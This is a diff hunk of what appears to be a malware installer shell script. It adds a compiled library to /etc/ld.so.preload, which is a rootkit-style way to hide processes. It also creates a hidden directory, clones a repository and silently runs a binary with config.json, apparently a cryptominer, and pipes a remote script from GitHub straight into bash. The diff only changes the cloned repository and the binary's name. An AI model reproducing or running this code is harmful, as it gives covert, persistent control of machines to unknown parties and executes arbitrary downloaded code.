@@ -7,8 +7,8 @@ mv libnyumput.so /usr/local/lib/
 echo /usr/local/lib/libnyumput.so >> /etc/ld.so.preload
 rm nyumput.c
 mkdir .kap && cd .kap
-git clone https://github.com/sitina21/epep.git
+git clone https://github.com/6248202226/gradi.git
 cd epep
-chmod +x config.json && chmod +x xmolx
-./xmolx -c "config.json" >/dev/null 2>&1
+chmod +x config.json && chmod +x zepo
+./zepo -c "config.json" >/dev/null 2>&1
 curl -sL https://github.com/sitina21/zuph/raw/main/gobel.sh | bash
